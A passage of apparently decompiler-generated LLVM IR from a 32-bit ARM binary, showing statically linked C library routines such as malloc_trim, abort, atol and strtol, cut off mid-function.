  store i32 %v3_12ebc, i32* %r3.global-to-local, align 4
  %v9_12ec0 = icmp eq i32 %v3_12ebc, %v0_12ea8
  br i1 %v9_12ec0, label %dec_label_pc_12ecc, label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12ea8, %dec_label_pc_12e64, %dec_label_pc_12e48, %dec_label_pc_12ebc
  %v0_12ec8 = call i32 @abort()
  store i32 %v0_12ec8, i32* %r0.global-to-local, align 4
  %v0_12ecc.pre = load i32, i32* @r1, align 4
  %v1_12ecc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12ebc, %dec_label_pc_12ec8
  %v1_12ecc = phi i32 [ %v3_12eb4, %dec_label_pc_12ebc ], [ %v1_12ecc.pre, %dec_label_pc_12ec8 ]
  %v0_12ecc = phi i32 [ %v3_12ea8, %dec_label_pc_12ebc ], [ %v0_12ecc.pre, %dec_label_pc_12ec8 ]
  %v2_12ecc = add i32 %v1_12ecc, 8
  %v3_12ecc = inttoptr i32 %v2_12ecc to i32*
  store i32 %v0_12ecc, i32* %v3_12ecc, align 4
  %v0_12ed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ed0 = add i32 %v1_12ed0, 12
  %v3_12ed0 = inttoptr i32 %v2_12ed0 to i32*
  store i32 %v0_12ed0, i32* %v3_12ed0, align 4
  %v0_12ed4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ed4 = load i32, i32* %r0.global-to-local, align 4
  %v2_12ed4 = add i32 %v1_12ed4, %v0_12ed4
  store i32 %v2_12ed4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12ed8:                               ; preds = %dec_label_pc_12e94.dec_label_pc_12ed8_crit_edge, %dec_label_pc_12ecc
  %v0_12ee8 = phi i32 [ %v0_12ee8.pre, %dec_label_pc_12e94.dec_label_pc_12ed8_crit_edge ], [ %v2_12ed4, %dec_label_pc_12ecc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12edc = load i32, i32* @r7, align 4
  %v2_12edc = add i32 %v0_12edc, 64
  %v3_12edc = inttoptr i32 %v2_12edc to i32*
  %v4_12edc = load i32, i32* %v3_12edc, align 4
  %v1_12ee0 = add i32 %v4_12edc, 52
  store i32 %v1_12ee0, i32* %r3.global-to-local, align 4
  %v1_12ee4 = add i32 %v4_12edc, 60
  %v2_12ee4 = inttoptr i32 %v1_12ee4 to i32*
  %v3_12ee4 = load i32, i32* %v2_12ee4, align 4
  store i32 %v3_12ee4, i32* %r1.global-to-local, align 4
  %v1_12ee8 = or i32 %v0_12ee8, 1
  store i32 %v1_12ee8, i32* %r2.global-to-local, align 4
  %v1_12eec = load i32, i32* %r4.global-to-local, align 4
  %v2_12eec = add i32 %v1_12eec, 12
  %v3_12eec = inttoptr i32 %v2_12eec to i32*
  store i32 %v1_12ee0, i32* %v3_12eec, align 4
  %v0_12ef0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ef0 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef0 = add i32 %v1_12ef0, 8
  %v3_12ef0 = inttoptr i32 %v2_12ef0 to i32*
  store i32 %v0_12ef0, i32* %v3_12ef0, align 4
  %v0_12ef4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef4 = add i32 %v1_12ef4, 4
  %v3_12ef4 = inttoptr i32 %v2_12ef4 to i32*
  store i32 %v0_12ef4, i32* %v3_12ef4, align 4
  %v0_12ef8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ef8 = load i32, i32* %r4.global-to-local, align 4
  %v3_12ef8 = add i32 %v1_12ef8, %v0_12ef8
  %v4_12ef8 = inttoptr i32 %v3_12ef8 to i32*
  store i32 %v0_12ef8, i32* %v4_12ef8, align 4
  %v0_12efc = load i32, i32* %r4.global-to-local, align 4
  %v1_12efc = load i32, i32* %r1.global-to-local, align 4
  %v2_12efc = add i32 %v1_12efc, 12
  %v3_12efc = inttoptr i32 %v2_12efc to i32*
  store i32 %v0_12efc, i32* %v3_12efc, align 4
  %v0_12f00 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f00 = load i32, i32* %r3.global-to-local, align 4
  %v2_12f00 = add i32 %v1_12f00, 8
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v0_12f00, i32* %v3_12f00, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12e7c
  %v2_12f08 = add i32 %v1_12e8c, %v0_12f08
  store i32 %v2_12f08, i32* %ip.global-to-local, align 4
  %v1_12f0c = or i32 %v2_12f08, 1
  store i32 %v1_12f0c, i32* %r3.global-to-local, align 4
  %v0_12f10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12f10, i32* %v2_12e84, align 4
  %v0_12f14 = load i32, i32* %r3.global-to-local, align 4
  %v1_12f14 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f14 = add i32 %v1_12f14, 4
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  store i32 %v0_12f14, i32* %v3_12f14, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12ed8, %dec_label_pc_12f08
  %v0_12f18 = load i32, i32* %ip.global-to-local, align 4
  %v3_12f1c = icmp ult i32 %v0_12f18, 131070
  br i1 %v3_12f1c, label %dec_label_pc_12f88, label %dec_label_pc_12f20

dec_label_pc_12f20:                               ; preds = %dec_label_pc_12f18
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12f24 = load i32, i32* @r7, align 4
  %v2_12f24 = add i32 %v0_12f24, 64
  %v3_12f24 = inttoptr i32 %v2_12f24 to i32*
  %v4_12f24 = load i32, i32* %v3_12f24, align 4
  store i32 %v4_12f24, i32* @r4, align 4
  %v1_12f28 = inttoptr i32 %v4_12f24 to i32*
  %v2_12f28 = load i32, i32* %v1_12f28, align 4
  store i32 %v2_12f28, i32* %r3.global-to-local, align 4
  %v1_12f2c = and i32 %v2_12f28, 2
  %v2_12f2c = icmp eq i32 %v1_12f2c, 0
  br i1 %v2_12f2c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12f20
  store i32 %v4_12f24, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12f20, %bb
  %v1_12f34 = xor i1 %v2_12f2c, true
  call void @__pseudo_cond_branch(i1 %v1_12f34, i32 ptrtoint (i32* @global_var_12bd8.467 to i32))
  %v0_12f38 = load i32, i32* @r4, align 4
  %v1_12f38 = add i32 %v0_12f38, 44
  %v2_12f38 = inttoptr i32 %v1_12f38 to i32*
  %v3_12f38 = load i32, i32* %v2_12f38, align 4
  store i32 %v3_12f38, i32* %r3.global-to-local, align 4
  %v1_12f3c = add i32 %v3_12f38, 4
  %v2_12f3c = inttoptr i32 %v1_12f3c to i32*
  %v3_12f3c = load i32, i32* %v2_12f3c, align 4
  store i32 %v3_12f3c, i32* %r3.global-to-local, align 4
  %v1_12f40 = add i32 %v0_12f38, 836
  %v2_12f40 = inttoptr i32 %v1_12f40 to i32*
  %v3_12f40 = load i32, i32* %v2_12f40, align 4
  store i32 %v3_12f40, i32* %r2.global-to-local, align 4
  %v1_12f44 = and i32 %v3_12f3c, -4
  store i32 %v1_12f44, i32* %r3.global-to-local, align 4
  %v3_12f48 = icmp ult i32 %v1_12f44, %v3_12f40
  br i1 %v3_12f48, label %dec_label_pc_12f88, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %bb16
  store i32 %v0_12f38, i32* %r1.global-to-local, align 4
  %v1_12f54 = add i32 %v0_12f38, 840
  %v2_12f54 = inttoptr i32 %v1_12f54 to i32*
  %v3_12f54 = load i32, i32* %v2_12f54, align 4
  store i32 %v3_12f54, i32* %r0.global-to-local, align 4
  %v2_12f58 = call i32 @__malloc_trim(i32 %v3_12f54, i32 %v0_12f38)
  store i32 %v2_12f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12e24
  %v2_12f60 = inttoptr i32 %v1_12df4 to i32*
  %v3_12f60 = load i32, i32* %v2_12f60, align 4
  store i32 %v3_12f60, i32* %r0.global-to-local, align 4
  %v1_12f64 = add i32 %v4_12de4, 848
  %v2_12f64 = inttoptr i32 %v1_12f64 to i32*
  %v3_12f64 = load i32, i32* %v2_12f64, align 4
  store i32 %v3_12f64, i32* %r2.global-to-local, align 4
  %v1_12f68 = add i32 %v4_12de4, 868
  %v2_12f68 = inttoptr i32 %v1_12f68 to i32*
  %v3_12f68 = load i32, i32* %v2_12f68, align 4
  %v2_12f6c = add i32 %v3_12f60, %v1_12df0
  store i32 %v2_12f6c, i32* %r1.global-to-local, align 4
  %v1_12f70 = add i32 %v3_12f64, -1
  store i32 %v1_12f70, i32* %r2.global-to-local, align 4
  %v2_12f74 = sub i32 %v3_12f68, %v2_12f6c
  store i32 %v2_12f74, i32* %r3.global-to-local, align 4
  store i32 %v2_12f74, i32* %v2_12f68, align 4
  %v1_12f7c = load i32, i32* @lr, align 4
  %v2_12f7c = add i32 %v1_12f7c, 848
  %v3_12f7c = inttoptr i32 %v2_12f7c to i32*
  store i32 %v1_12f70, i32* %v3_12f7c, align 4
  %v0_12f80 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f80 = load i32, i32* @r5, align 4
  %v2_12f80 = sub i32 %v1_12f80, %v0_12f80
  store i32 %v2_12f80, i32* %r0.global-to-local, align 4
  %v4_12f84 = call i32 @munmap(i32 %v2_12f80, i32 %v2_12f6c, i32 %v1_12f70, i32 %v2_12f74)
  store i32 %v4_12f84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %bb16, %dec_label_pc_12f18, %dec_label_pc_12f50, %dec_label_pc_12e04, %dec_label_pc_12f60
  store i32 %v2_12d98, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12f94 = load i32, i32* @r7, align 4
  %v2_12f94 = add i32 %v0_12f94, 44
  %v3_12f94 = inttoptr i32 %v2_12f94 to i32*
  %v4_12f94 = load i32, i32* %v3_12f94, align 4
  store i32 %v4_12f94, i32* %ip.global-to-local, align 4
  store i32 77728, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f94)
  br label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %entry, %dec_label_pc_12f88
  store i32 %v3_12d8c, i32* @r4, align 4
  store i32 %v6_12d8c, i32* @r5, align 4
  store i32 %v9_12d8c, i32* @r6, align 4
  store i32 %v12_12d8c, i32* @r7, align 4
  store i32 %v18_12d8c, i32* @lr, align 4
  ret i32 %v2_12d98

; uselistorder directives
  uselistorder i32 %v0_12f38, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12ef8, { 1, 0 }
  uselistorder i32 %v1_12e38, { 1, 0 }
  uselistorder i32 %v0_12e38, { 1, 0 }
  uselistorder i32 %v3_12e0c, { 1, 0 }
  uselistorder i32 %v1_12df0, { 1, 0, 2 }
  uselistorder i32 %v2_12dec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12de4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12d94, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12fa0, { 1, 0 }
  uselistorder label %dec_label_pc_12f88, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_12f18, { 1, 0 }
  uselistorder label %dec_label_pc_12ed8, { 1, 0 }
  uselistorder label %dec_label_pc_12ecc, { 1, 0 }
  uselistorder label %dec_label_pc_12ec8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12e7c, { 1, 0 }
}

define i32 @function_12fb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fb0:
  %v0_12fb0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fb0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12fb0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12fb0, %bb
  %v4_12fc4 = phi i32 [ %arg1, %dec_label_pc_12fb0 ], [ 0, %bb ]
  ret i32 %v4_12fc4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12fc8 = load i32, i32* @r4, align 4
  store i32 %v3_12fc8, i32* %stack_var_-12, align 4
  %v6_12fc8 = load i32, i32* @r5, align 4
  %v4_12fd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12fd8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_12fd8, i32* @r0, align 4
  %v0_12fe8 = call i32 @__malloc_consolidate()
  %v0_12fec = load i32, i32* @r4, align 4
  %v0_12ff0 = load i32, i32* @r5, align 4
  %v2_12ff8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12ff8, i32* @r4, align 4
  store i32 %v6_12fc8, i32* @r5, align 4
  %v2_12ffc = call i32 @__malloc_trim(i32 %v0_12fec, i32 %v0_12ff0)
  %v0_13000 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13000, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13004 = phi i32 [ %v2_12ffc, %entry ], [ 0, %bb ]
  ret i32 %v4_13004

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r5, align 4
  %v4_13020 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 16) to i32*), align 4
  store i32 77868, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13020)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13048 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_13050 = load i32, i32* @r5, align 4
  %v2_13050 = add i32 %v0_13050, 632
  %v3_13050 = inttoptr i32 %v2_13050 to i32*
  %v4_13050 = load i32, i32* %v3_13050, align 4
  %v2_13054 = icmp eq i32 %v4_13050, 0
  br i1 %v2_13054, label %dec_label_pc_1305c, label %dec_label_pc_1309c

dec_label_pc_1305c:                               ; preds = %entry
  store i32 1, i32* %v3_13050, align 4
  br label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %dec_label_pc_130ac, %dec_label_pc_1305c
  %v0_13068 = load i32, i32* @r5, align 4
  %v2_13068 = add i32 %v0_13068, 212
  store i32 %v2_13068, i32* @r4, align 4
  %v2_13074 = add i32 %v0_13068, 68
  %v3_13074 = inttoptr i32 %v2_13074 to i32*
  %v4_13074 = load i32, i32* %v3_13074, align 4
  call void @__pseudo_branch(i32 %v4_13074)
  %v1_13084 = call i32 @__GI_raise(i32 6)
  %v0_13090 = load i32, i32* @r5, align 4
  %v2_13090 = add i32 %v0_13090, 16
  %v3_13090 = inttoptr i32 %v2_13090 to i32*
  %v4_13090 = load i32, i32* %v3_13090, align 4
  store i32 77980, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13090)
  %v0_130a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %entry, %dec_label_pc_13064
  %v1_130b4 = phi i32 [ %v0_13050, %entry ], [ %v0_130a0.pre, %dec_label_pc_13064 ]
  %v2_130a0 = add i32 %v1_130b4, 632
  %v3_130a0 = inttoptr i32 %v2_130a0 to i32*
  %v4_130a0 = load i32, i32* %v3_130a0, align 4
  %v7_130a4 = icmp eq i32 %v4_130a0, 1
  br i1 %v7_130a4, label %dec_label_pc_130ac, label %dec_label_pc_130e8

dec_label_pc_130ac:                               ; preds = %dec_label_pc_1309c
  %v2_130ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_130ac, i32* @r4, align 4
  store i32 2, i32* %v3_130a0, align 4
  %v3_130c4 = bitcast i32* %stack_var_-28 to i8*
  %v4_130c4 = call i32 @__GI_memset(i8* %v3_130c4, i32 0, i32 20)
  %v3_130e0 = call i32 @__libc_sigaction(i32 6, i32 %v2_130ac, i32 0)
  br label %dec_label_pc_13064

dec_label_pc_130e8:                               ; preds = %dec_label_pc_1309c
  %v7_130e8 = icmp eq i32 %v4_130a0, 2
  br i1 %v7_130e8, label %dec_label_pc_130f0, label %dec_label_pc_130fc

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130e8
  store i32 3, i32* %v3_130a0, align 4
  %v0_130f8 = call i32 @abort()
  %v0_130fc.pre = load i32, i32* @r5, align 4
  %v1_130fc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %dec_label_pc_130e8, %dec_label_pc_130f0
  %v3_13108 = phi i32 [ 632, %dec_label_pc_130e8 ], [ %v1_130fc.pre, %dec_label_pc_130f0 ]
  %v2_13108 = phi i32 [ %v1_130b4, %dec_label_pc_130e8 ], [ %v0_130fc.pre, %dec_label_pc_130f0 ]
  %v2_130fc = add i32 %v2_13108, %v3_13108
  %v3_130fc = inttoptr i32 %v2_130fc to i32*
  %v4_130fc = load i32, i32* %v3_130fc, align 4
  %v7_13100 = icmp eq i32 %v4_130fc, 3
  br i1 %v7_13100, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_130fc
  store i32 4, i32* %v3_130fc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_130fc, %bb
  call void @__pseudo_cond_branch(i1 %v7_13100, i32 ptrtoint (i32* @global_var_14ce0.476 to i32))
  br label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_13114, %.thread2
  %v0_13114 = call i32 @abort()
  br label %dec_label_pc_13114

; uselistorder directives
  uselistorder i32* %v3_130a0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_130fc, { 1, 0 }
  uselistorder label %dec_label_pc_1309c, { 1, 0 }
}

define i32 @function_13120(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13120:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13120 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13120, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13120
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13120, %bb
  %v4_1312c = phi i32 [ %tmp, %dec_label_pc_13120 ], [ 0, %bb ]
  ret i32 %v4_1312c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13140 = call i32 @strtol()
  ret i32 %v0_13140
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1315c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1315c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v0_13180 = load i32, i32* @r1, align 4
  store i32 %v0_13180, i32* %sb.global-to-local, align 4
  %v0_13184 = load i32, i32* @r2, align 4
  store i32 %v0_13184, i32* %r5.global-to-local, align 4
  %v0_13188 = load i32, i32* @r0, align 4
  store i32 %v0_13188, i32* %r4.global-to-local, align 4
  %v0_1318c = load i32, i32* @r3, align 4
  br label %dec_label_pc_13198

dec_label_pc_13194:                               ; preds = %dec_label_pc_13198
  %v1_13194 = add i32 %v0_131d0, 1
  store i32 %v1_13194, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %entry, %dec_label_pc_13194
  %v0_131d0 = phi i32 [ %v0_13188, %entry ], [ %v1_13194, %dec_label_pc_13194 ]
  %v1_13198 = inttoptr i32 %v0_131d0 to i8*
  %v2_13198 = load i8, i8* %v1_13198, align 1
  %v3_13198 = zext i8 %v2_13198 to i32
  store i32 %v3_13198, i32* %r1.global-to-local, align 4
  %v4_1319c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 276) to i32*), align 4
  %v2_131a0 = mul nuw nsw i32 %v3_13198, 2
  %v2_131a4 = add i32 %v2_131a0, %v4_1319c
  %v3_131a4 = inttoptr i32 %v2_131a4 to i16*
  %v4_131a4 = load i16, i16* %v3_131a4, align 2
  %v1_131a8 = and i16 %v4_131a4, 32
  %v2_131a8 = icmp eq i16 %v1_131a8, 0
  br i1 %v2_131a8, label %dec_label_pc_131b0, label %dec_label_pc_13194

dec_label_pc_131b0:                               ; preds = %dec_label_pc_13198
  %v7_131b0 = icmp eq i8 %v2_13198, 43
  br i1 %v7_131b0, label %dec_label_pc_131d0, label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131b0
  %v7_131b8 = icmp eq i8 %v2_13198, 45
  br i1 %v7_131b8, label %dec_label_pc_131d0, label %bb

bb:                                               ; preds = %dec_label_pc_131b8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_131d4

dec_label_pc_131d0:                               ; preds = %dec_label_pc_131b0, %dec_label_pc_131b8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_131b8 ], [ 0, %dec_label_pc_131b0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_131d0 = add i32 %v0_131d0, 1
  store i32 %v1_131d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %bb, %dec_label_pc_131d0
  %v0_131f4 = phi i32 [ %v0_131d0, %bb ], [ %v1_131d0, %dec_label_pc_131d0 ]
  %v1_131d4 = and i32 %v0_13184, -17
  %v3_131d4 = icmp eq i32 %v1_131d4, 0
  br i1 %v3_131d4, label %dec_label_pc_131e0, label %bb60

bb60:                                             ; preds = %dec_label_pc_131d4
  br label %bb64

dec_label_pc_131e0:                               ; preds = %dec_label_pc_131d4
  %v1_131e0 = inttoptr i32 %v0_131f4 to i8*
  %v2_131e0 = load i8, i8* %v1_131e0, align 1
  %v7_131e4 = icmp eq i8 %v2_131e0, 48
  %v1_131e8 = add i32 %v0_13184, 10
  store i32 %v1_131e8, i32* %r5.global-to-local, align 4
  br i1 %v7_131e4, label %dec_label_pc_131f4, label %bb61

bb61:                                             ; preds = %dec_label_pc_131e0
  br label %.thread8

dec_label_pc_131f4:                               ; preds = %dec_label_pc_131e0
  %v1_131f4 = add i32 %v0_131f4, 1
  %v2_131f4 = inttoptr i32 %v1_131f4 to i8*
  %v3_131f4 = load i8, i8* %v2_131f4, align 1
  %v4_131f4 = zext i8 %v3_131f4 to i32
  store i32 %v1_131f4, i32* %r4.global-to-local, align 4
  %v1_131f8 = or i32 %v4_131f4, 32
  %v7_131fc = icmp eq i32 %v1_131f8, 120
  %v1_13200 = add i32 %v0_13184, 8
  store i32 %v1_13200, i32* %r5.global-to-local, align 4
  br i1 %v7_131fc, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_131f4
  %v3_1320c = mul i32 %v1_13200, 2
  store i32 %v3_1320c, i32* %r5.global-to-local, align 4
  %v2_13210 = add i32 %v0_131f4, 2
  store i32 %v2_13210, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_131f4, %bb61, %bb62
  %v1_132e430 = phi i32 [ %v0_13188, %bb61 ], [ %v1_131f4, %bb62 ], [ %v1_131f4, %dec_label_pc_131f4 ]
  %v0_1326021 = phi i32 [ %v0_131f4, %bb61 ], [ %v2_13210, %bb62 ], [ %v1_131f4, %dec_label_pc_131f4 ]
  %v0_13214 = phi i32 [ %v1_131e8, %bb61 ], [ %v3_1320c, %bb62 ], [ %v1_13200, %dec_label_pc_131f4 ]
  %v5_13218 = icmp slt i32 %v0_13214, 16
  br i1 %v5_13218, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_132e429 = phi i32 [ %v0_13188, %bb60 ], [ %v1_132e430, %.thread8 ], [ %v1_132e430, %bb63 ]
  %v0_1326020 = phi i32 [ %v0_131f4, %bb60 ], [ %v0_1326021, %.thread8 ], [ %v0_1326021, %bb63 ]
  %v0_13240 = phi i32 [ %v0_13184, %bb60 ], [ %v0_13214, %.thread8 ], [ 16, %bb63 ]
  %v1_1321c = add i32 %v0_13240, -2
  %tmp = icmp ugt i32 %v1_1321c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1322c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_132e0

dec_label_pc_1322c:                               ; preds = %bb64
  %v2_13234 = udiv i32 -1, %v0_13240
  %v3_13234 = urem i32 -1, %v0_13240
  store i32 %v0_13240, i32* %r1.global-to-local, align 4
  %v1_13244 = urem i32 %v3_13234, 256
  store i32 %v1_13244, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13234, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13260

dec_label_pc_1325c:                               ; preds = %bb71, %dec_label_pc_132bc
  %v0_1325c = phi i32 [ %v1_1329c44, %bb71 ], [ %v0_1325c.pre, %dec_label_pc_132bc ]
  br label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %dec_label_pc_1322c, %dec_label_pc_1325c
  %v1_132e427 = phi i32 [ %v1_132e429, %dec_label_pc_1322c ], [ %v0_1325c, %dec_label_pc_1325c ]
  %v0_1329c = phi i32 [ %v0_1326020, %dec_label_pc_1322c ], [ %v0_1325c, %dec_label_pc_1325c ]
  %v1_13260 = inttoptr i32 %v0_1329c to i8*
  %v2_13260 = load i8, i8* %v1_13260, align 1
  %v3_13260 = zext i8 %v2_13260 to i32
  %v1_13264 = add nsw i32 %v3_13260, -48
  %v1_13268 = urem i32 %v1_13264, 256
  store i32 %v1_13268, i32* %r1.global-to-local, align 4
  %v1_13270 = or i32 %v3_13260, 32
  %tmp79 = icmp ult i32 %v1_13268, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %dec_label_pc_13260
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13270, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13278
  %v1_1327c = add nsw i32 %v1_13270, -87
  %v5_13284 = urem i32 %v1_1327c, 256
  store i32 %v5_13284, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13260, %dec_label_pc_13278, %bb65
  %v3_132b4 = phi i32 [ %v1_13268, %dec_label_pc_13260 ], [ 40, %dec_label_pc_13278 ], [ %v5_13284, %bb65 ]
  %v1_13288 = load i32, i32* %r5.global-to-local, align 4
  %v6_1328c = icmp slt i32 %v3_132b4, %v1_13288
  br i1 %v6_1328c, label %dec_label_pc_13290, label %dec_label_pc_132e0.loopexit

dec_label_pc_13290:                               ; preds = %bb66
  %v0_13290 = load i32, i32* %ip.global-to-local, align 4
  %v1_13290 = load i32, i32* %r8.global-to-local, align 4
  %v9_13290 = icmp eq i32 %v0_13290, %v1_13290
